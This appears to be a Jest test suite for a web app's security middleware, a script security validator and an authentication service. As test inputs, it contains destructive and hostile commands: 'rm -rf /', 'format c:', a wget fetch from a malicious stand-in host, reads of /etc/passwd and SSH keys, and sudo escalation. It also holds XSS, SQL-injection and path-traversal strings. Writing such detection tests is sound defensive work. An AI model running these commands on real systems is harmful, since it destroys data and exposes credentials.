import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import request from 'supertest';
import express from 'express';
import { 
  securityHeaders, 
  corsOptions, 
  apiRateLimiter, 
  authRateLimiter, 
  sanitizeInput,
  InputSanitizer,
  validateRequest,
  passwordStrengthSchema
} from '../src/middleware/security';
import { ScriptSecurityValidator } from '../src/services/scriptSecurityValidator';
import { AuthService } from '../src/services/authService';
import Joi from 'joi';

// Mock logger
jest.mock('../src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn()
  }
}));

// Mock database
jest.mock('../src/database/init', () => ({
  getDatabase: jest.fn(() => ({
    get: jest.fn(),
    run: jest.fn(),
    all: jest.fn()
  }))
}));

describe('Security Middleware Tests', () => {
  let app: express.Application;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  describe('Security Headers', () => {
    test('should set security headers', async () => {
      app.use(securityHeaders);
      app.get('/test', (req, res) => res.json({ test: true }));

      const response = await request(app).get('/test');
      
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['strict-transport-security']).toMatch(/max-age=31536000/);
      expect(response.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    });

    test('should set CSP headers', async () => {
      app.use(securityHeaders);
      app.get('/test', (req, res) => res.json({ test: true }));

      const response = await request(app).get('/test');
      
      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['content-security-policy']).toMatch(/default-src 'self'/);
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize XSS attempts', () => {
      const maliciousInput = '<script>alert("xss")</script>Hello World';
      const sanitized = InputSanitizer.sanitizeString(maliciousInput);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toBe('Hello World');
    });

    test('should sanitize SQL injection attempts', () => {
      const maliciousInput = "'; DROP TABLE users; --";
      const sanitized = InputSanitizer.sanitizeString(maliciousInput, 'sql');
      
      expect(sanitized).not.toContain('DROP TABLE');
      expect(sanitized).not.toContain('--');
    });

    test('should sanitize object properties', () => {
      const maliciousObject = {
        name: 'John',
        email: '<script>alert("xss")</script>john@example.com',
        nested: {
          value: 'javascript:void(0)'
        }
      };

      const sanitized = InputSanitizer.sanitizeObject(maliciousObject);
      
      expect(sanitized.email).not.toContain('<script>');
      expect(sanitized.nested.value).not.toContain('javascript:');
    });

    test('should handle arrays in objects', () => {
      const maliciousObject = {
        tags: ['tag1', '<script>alert("xss")</script>', 'tag3']
      };

      const sanitized = InputSanitizer.sanitizeObject(maliciousObject);
      
      expect(sanitized.tags[1]).not.toContain('<script>');
    });

    test('should sanitize middleware', async () => {
      app.use(sanitizeInput('general'));
      app.post('/test', (req, res) => res.json(req.body));

      const maliciousPayload = {
        username: 'test<script>alert("xss")</script>',
        description: 'javascript:void(0)'
      };

      const response = await request(app)
        .post('/test')
        .send(maliciousPayload);

      expect(response.body.username).not.toContain('<script>');
      expect(response.body.description).not.toContain('javascript:');
    });
  });

  describe('Request Validation', () => {
    test('should validate request body with Joi schema', async () => {
      const schema = Joi.object({
        username: Joi.string().alphanum().min(3).max(30).required(),
        email: Joi.string().email().required()
      });

      app.use(validateRequest(schema));
      app.post('/test', (req, res) => res.json({ success: true }));

      // Valid request
      const validResponse = await request(app)
        .post('/test')
        .send({ username: 'testuser', email: 'test@example.com' });

      expect(validResponse.status).toBe(200);

      // Invalid request
      const invalidResponse = await request(app)
        .post('/test')
        .send({ username: 'te', email: 'invalid-email' });

      expect(invalidResponse.status).toBe(400);
      expect(invalidResponse.body).toHaveProperty('error', 'Validation failed');
      expect(invalidResponse.body).toHaveProperty('details');
    });

    test('should strip unknown properties', async () => {
      const schema = Joi.object({
        username: Joi.string().required()
      });

      app.use(validateRequest(schema));
      app.post('/test', (req, res) => res.json(req.body));

      const response = await request(app)
        .post('/test')
        .send({ 
          username: 'testuser', 
          maliciousField: 'should be removed'
        });

      expect(response.body).toEqual({ username: 'testuser' });
      expect(response.body).not.toHaveProperty('maliciousField');
    });
  });

  describe('Password Strength Validation', () => {
    test('should reject weak passwords', () => {
      const weakPasswords = [
        'password',
        '12345678',
        'Password1',
        'short',
        'nouppercase123!',
        'NOLOWERCASE123!',
        'NoSpecialChars123',
        'NoNumbers!@#'
      ];

      weakPasswords.forEach(password => {
        const { error } = passwordStrengthSchema.validate(password);
        expect(error).toBeDefined();
      });
    });

    test('should accept strong passwords', () => {
      const strongPasswords = [
        'StrongPassword123!',
        'MySecureP@ssw0rd',
        'C0mpl3xP@ssw0rd!',
        'V3ry$ecur3P@ss'
      ];

      strongPasswords.forEach(password => {
        const { error } = passwordStrengthSchema.validate(password);
        expect(error).toBeUndefined();
      });
    });
  });

  describe('Rate Limiting', () => {
    test('should limit requests per window', async () => {
      // Create a test rate limiter with very low limits
      const testRateLimit = require('express-rate-limit')({
        windowMs: 1000,
        max: 2,
        message: { error: 'Rate limit exceeded' }
      });

      app.use(testRateLimit);
      app.get('/test', (req, res) => res.json({ success: true }));

      // First two requests should succeed
      await request(app).get('/test').expect(200);
      await request(app).get('/test').expect(200);

      // Third request should be rate limited
      const response = await request(app).get('/test');
      expect(response.status).toBe(429);
    });
  });
});

describe('Script Security Validator Tests', () => {
  describe('Basic Validation', () => {
    test('should reject empty scripts', async () => {
      const result = await ScriptSecurityValidator.validateScript('', 'bash');
      
      expect(result.isValid).toBe(false);
      expect(result.isSecure).toBe(false);
      expect(result.securityScore).toBe(0);
      expect(result.risks).toHaveLength(1);
      expect(result.risks[0].type).toBe('empty_script');
    });

    test('should handle oversized scripts', async () => {
      const largeScript = 'echo "test"\n'.repeat(10000);
      const result = await ScriptSecurityValidator.validateScript(largeScript, 'bash');
      
      const sizeRisk = result.risks.find(r => r.type === 'size_limit');
      expect(sizeRisk).toBeDefined();
      expect(sizeRisk?.severity).toBe('medium');
    });
  });

  describe('Destructive Command Detection', () => {
    test('should detect dangerous rm commands', async () => {
      const dangerousScript = 'rm -rf /';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      expect(result.isSecure).toBe(false);
      const destructiveRisk = result.risks.find(r => r.type === 'critical_destructive');
      expect(destructiveRisk).toBeDefined();
      expect(destructiveRisk?.severity).toBe('critical');
    });

    test('should detect format commands', async () => {
      const dangerousScript = 'format c:';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'batch');
      
      expect(result.isSecure).toBe(false);
      const destructiveRisk = result.risks.find(r => r.type === 'critical_destructive');
      expect(destructiveRisk).toBeDefined();
    });
  });

  describe('Code Execution Detection', () => {
    test('should detect eval usage', async () => {
      const dangerousScript = 'eval("malicious code")';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      const codeExecRisk = result.risks.find(r => r.type === 'critical_code_execution');
      expect(codeExecRisk).toBeDefined();
      expect(codeExecRisk?.severity).toBe('high');
    });

    test('should detect command substitution', async () => {
      const dangerousScript = 'echo $(rm -rf /)';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      const codeExecRisk = result.risks.find(r => r.type === 'critical_code_execution');
      expect(codeExecRisk).toBeDefined();
    });

    test('should detect backtick execution', async () => {
      const dangerousScript = 'echo `rm -rf /`';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      const codeExecRisk = result.risks.find(r => r.type === 'critical_code_execution');
      expect(codeExecRisk).toBeDefined();
    });
  });

  describe('Network Operations Detection', () => {
    test('should detect wget/curl usage', async () => {
      const networkScript = 'wget http://malicious.com/payload';
      const result = await ScriptSecurityValidator.validateScript(networkScript, 'bash');
      
      const networkRisk = result.risks.find(r => r.type === 'critical_network');
      expect(networkRisk).toBeDefined();
      expect(networkRisk?.severity).toBe('medium');
    });

    test('should detect ssh usage', async () => {
      const networkScript = 'ssh user@remote.com';
      const result = await ScriptSecurityValidator.validateScript(networkScript, 'bash');
      
      const networkRisk = result.risks.find(r => r.type === 'critical_network');
      expect(networkRisk).toBeDefined();
    });
  });

  describe('Credential Access Detection', () => {
    test('should detect access to sensitive files', async () => {
      const credentialScript = 'cat /etc/passwd';
      const result = await ScriptSecurityValidator.validateScript(credentialScript, 'bash');
      
      const credentialRisk = result.risks.find(r => r.type === 'critical_credentials');
      expect(credentialRisk).toBeDefined();
      expect(credentialRisk?.severity).toBe('critical');
    });

    test('should detect SSH key access', async () => {
      const credentialScript = 'cp ~/.ssh/id_rsa /tmp/';
      const result = await ScriptSecurityValidator.validateScript(credentialScript, 'bash');
      
      const credentialRisk = result.risks.find(r => r.type === 'critical_credentials');
      expect(credentialRisk).toBeDefined();
    });
  });

  describe('Language-Specific Validation', () => {
    test('should detect PowerShell dangerous operations', async () => {
      const psScript = 'Invoke-Expression "malicious code"';
      const result = await ScriptSecurityValidator.validateScript(psScript, 'powershell');
      
      const psRisk = result.risks.find(r => r.type === 'powershell_security');
      expect(psRisk).toBeDefined();
      expect(psRisk?.severity).toBe('high');
    });

    test('should detect Python dangerous operations', async () => {
      const pyScript = 'exec("malicious code")';
      const result = await ScriptSecurityValidator.validateScript(pyScript, 'python');
      
      const pyRisk = result.risks.find(r => r.type === 'python_security');
      expect(pyRisk).toBeDefined();
    });

    test('should detect Ansible dangerous operations', async () => {
      const ansibleScript = 'ansible_become_pass: "password"';
      const result = await ScriptSecurityValidator.validateScript(ansibleScript, 'ansible');
      
      const ansibleRisk = result.risks.find(r => r.type === 'ansible_security');
      expect(ansibleRisk).toBeDefined();
    });
  });

  describe('Obfuscation Detection', () => {
    test('should detect base64 encoding', async () => {
      const obfuscatedScript = 'echo "SGVsbG8gV29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBzaG91bGQgYmUgZGV0ZWN0ZWQ="';
      const result = await ScriptSecurityValidator.validateScript(obfuscatedScript, 'bash');
      
      const obfuscationRisk = result.risks.find(r => r.type === 'obfuscation');
      expect(obfuscationRisk).toBeDefined();
      expect(obfuscationRisk?.severity).toBe('high');
    });

    test('should detect hex encoding', async () => {
      const obfuscatedScript = 'echo "\\x48\\x65\\x6c\\x6c\\x6f"';
      const result = await ScriptSecurityValidator.validateScript(obfuscatedScript, 'bash');
      
      const obfuscationRisk = result.risks.find(r => r.type === 'obfuscation');
      expect(obfuscationRisk).toBeDefined();
      expect(obfuscationRisk?.severity).toBe('medium');
    });

    test('should detect excessive string concatenation', async () => {
      const obfuscatedScript = '"ma" + "li" + "ci" + "ou" + "s" + "co" + "de"';
      const result = await ScriptSecurityValidator.validateScript(obfuscatedScript.repeat(3), 'bash');
      
      const obfuscationRisk = result.risks.find(r => r.type === 'obfuscation');
      expect(obfuscationRisk).toBeDefined();
    });
  });

  describe('Path Traversal Detection', () => {
    test('should detect directory traversal attempts', async () => {
      const traversalScript = 'cat ../../etc/passwd';
      const result = await ScriptSecurityValidator.validateScript(traversalScript, 'bash');
      
      const pathRisk = result.risks.find(r => r.type === 'path_traversal');
      expect(pathRisk).toBeDefined();
      expect(pathRisk?.severity).toBe('high');
    });

    test('should detect URL encoded traversal', async () => {
      const traversalScript = 'cat %2e%2e/etc/passwd';
      const result = await ScriptSecurityValidator.validateScript(traversalScript, 'bash');
      
      const pathRisk = result.risks.find(r => r.type === 'path_traversal');
      expect(pathRisk).toBeDefined();
    });
  });

  describe('Privilege Escalation Detection', () => {
    test('should detect sudo usage', async () => {
      const privEscScript = 'sudo rm -rf /';
      const result = await ScriptSecurityValidator.validateScript(privEscScript, 'bash', false);
      
      const privRisk = result.risks.find(r => r.type === 'privilege_escalation');
      expect(privRisk).toBeDefined();
      expect(privRisk?.severity).toBe('critical');
    });

    test('should allow sudo when elevated privileges are allowed', async () => {
      const privEscScript = 'sudo systemctl restart nginx';
      const result = await ScriptSecurityValidator.validateScript(privEscScript, 'bash', true);
      
      const privRisk = result.risks.find(r => r.type === 'privilege_escalation');
      expect(privRisk).toBeUndefined();
    });

    test('should detect PowerShell elevation', async () => {
      const privEscScript = 'Start-Process -Verb RunAs';
      const result = await ScriptSecurityValidator.validateScript(privEscScript, 'powershell', false);
      
      const privRisk = result.risks.find(r => r.type === 'privilege_escalation');
      expect(privRisk).toBeDefined();
    });
  });

  describe('Security Scoring', () => {
    test('should give high score to safe scripts', async () => {
      const safeScript = `
        echo "Hello World"
        date
        whoami
        ls -la
      `;
      const result = await ScriptSecurityValidator.validateScript(safeScript, 'bash');
      
      expect(result.securityScore).toBeGreaterThan(80);
      expect(result.isSecure).toBe(true);
      expect(result.isValid).toBe(true);
    });

    test('should give low score to dangerous scripts', async () => {
      const dangerousScript = `
        rm -rf /
        eval("malicious code")
        cat /etc/passwd
        sudo su -
      `;
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      expect(result.securityScore).toBeLessThan(30);
      expect(result.isSecure).toBe(false);
      expect(result.isValid).toBe(false);
    });
  });

  describe('Script Metadata Generation', () => {
    test('should generate accurate metadata', async () => {
      const script = `
        if [ -f /etc/passwd ]; then
          echo "File exists"
        fi
        
        for i in {1..10}; do
          echo $i
        done
        
        function test_function() {
          return 0
        }
      `;
      const result = await ScriptSecurityValidator.validateScript(script, 'bash');
      
      expect(result.metadata.linesOfCode).toBeGreaterThan(0);
      expect(result.metadata.complexity).toBeGreaterThan(0);
      expect(result.metadata.hasFileSystemAccess).toBe(false); // echo is not considered dangerous
      expect(result.metadata.hasNetworkAccess).toBe(false);
    });
  });

  describe('Script Signatures', () => {
    test('should generate and verify signatures', () => {
      const script = 'echo "Hello World"';
      const signedBy = 'test-user';
      
      const signature = ScriptSecurityValidator.generateSignature(script, signedBy);
      
      expect(signature.hash).toBeDefined();
      expect(signature.algorithm).toBe('SHA-256');
      expect(signature.signedBy).toBe(signedBy);
      expect(signature.timestamp).toBeDefined();
      
      const isValid = ScriptSecurityValidator.verifySignature(script, signature);
      expect(isValid).toBe(true);
      
      // Test with modified script
      const modifiedScript = 'echo "Hello Modified World"';
      const isInvalid = ScriptSecurityValidator.verifySignature(modifiedScript, signature);
      expect(isInvalid).toBe(false);
    });
  });

  describe('Safe Execution Check', () => {
    test('should approve safe scripts for execution', async () => {
      const safeScript = 'echo "Hello World"';
      const result = await ScriptSecurityValidator.validateScript(safeScript, 'bash');
      
      const isSafe = ScriptSecurityValidator.isSafeForExecution(result);
      expect(isSafe).toBe(true);
    });

    test('should reject dangerous scripts for execution', async () => {
      const dangerousScript = 'rm -rf /';
      const result = await ScriptSecurityValidator.validateScript(dangerousScript, 'bash');
      
      const isSafe = ScriptSecurityValidator.isSafeForExecution(result);
      expect(isSafe).toBe(false);
    });
  });

  describe('Security Report Generation', () => {
    test('should generate comprehensive security report', async () => {
      const script = `
        echo "Hello World"
        rm -rf /tmp/test
        wget http://example.com
      `;
      const result = await ScriptSecurityValidator.validateScript(script, 'bash');
      
      const report = ScriptSecurityValidator.generateSecurityReport(result);
      
      expect(report).toContain('Script Security Analysis Report');
      expect(report).toContain('Security Score:');
      expect(report).toContain('Validation Status:');
      expect(report).toContain('Security Status:');
      expect(report).toContain('Metadata:');
      
      if (result.risks.length > 0) {
        expect(report).toContain('Security Risks');
      }
    });
  });
});

describe('Authentication Service Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Password Strength Validation', () => {
    test('should validate strong passwords', () => {
      const result = AuthService.validatePasswordStrength('StrongP@ssw0rd123');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    test('should reject weak passwords', () => {
      const result = AuthService.validatePasswordStrength('weak');
      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    test('should detect common patterns', () => {
      const result = AuthService.validatePasswordStrength('Password123!');
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('common patterns'))).toBe(true);
    });
  });

  describe('Password Hashing', () => {
    test('should hash passwords securely', async () => {
      const password = 'TestPassword123!';
      const hash = await AuthService.hashPassword(password);
      
      expect(hash).toBeDefined();
      expect(hash).not.toBe(password);
      expect(hash.length).toBeGreaterThan(50); // bcrypt hashes are long
    });
  });

  describe('Session ID Generation', () => {
    test('should generate unique session IDs', () => {
      const sessionId1 = AuthService.generateSessionId();
      const sessionId2 = AuthService.generateSessionId();
      
      expect(sessionId1).toBeDefined();
      expect(sessionId2).toBeDefined();
      expect(sessionId1).not.toBe(sessionId2);
      expect(sessionId1.length).toBe(64); // 32 bytes in hex
    });
  });

  describe('Token Verification', () => {
    test('should handle invalid tokens gracefully', async () => {
      const result = await AuthService.verifyAccessToken('invalid-token');
      expect(result).toBeNull();
    });
  });
});

describe('Security Integration Tests', () => {
  let app: express.Application;

  beforeEach(() => {
    app = express();
    app.use(express.json());
    app.use(securityHeaders);
    app.use(sanitizeInput('general'));
  });

  test('should handle malicious payload end-to-end', async () => {
    const schema = Joi.object({
      username: Joi.string().alphanum().min(3).max(30).required(),
      script: Joi.string().max(1000).required()
    });

    app.use(validateRequest(schema));
    app.post('/api/scripts', async (req, res) => {
      const { script } = req.body;
      const validation = await ScriptSecurityValidator.validateScript(script, 'bash');
      
      if (!validation.isSecure) {
        return res.status(400).json({
          error: 'Script contains security risks',
          risks: validation.risks
        });
      }
      
      res.json({ success: true, securityScore: validation.securityScore });
    });

    const maliciousPayload = {
      username: 'attacker<script>alert("xss")</script>',
      script: 'rm -rf / && cat /etc/passwd'
    };

    const response = await request(app)
      .post('/api/scripts')
      .send(maliciousPayload);

    expect(response.status).toBe(400);
    expect(response.body).toHaveProperty('error');
    expect(response.body).toHaveProperty('risks');
    
    // Verify XSS was sanitized
    expect(JSON.stringify(response.body)).not.toContain('<script>');
  });

  test('should allow safe scripts through security checks', async () => {
    const schema = Joi.object({
      username: Joi.string().alphanum().min(3).max(30).required(),
      script: Joi.string().max(1000).required()
    });

    app.use(validateRequest(schema));
    app.post('/api/scripts', async (req, res) => {
      const { script } = req.body;
      const validation = await ScriptSecurityValidator.validateScript(script, 'bash');
      
      if (!validation.isSecure) {
        return res.status(400).json({
          error: 'Script contains security risks',
          risks: validation.risks
        });
      }
      
      res.json({ success: true, securityScore: validation.securityScore });
    });

    const safePayload = {
      username: 'gooduser',
      script: 'echo "Hello World" && date && whoami'
    };

    const response = await request(app)
      .post('/api/scripts')
      .send(safePayload);

    expect(response.status).toBe(200);
    expect(response.body.success).toBe(true);
    expect(response.body.securityScore).toBeGreaterThan(70);
  });
});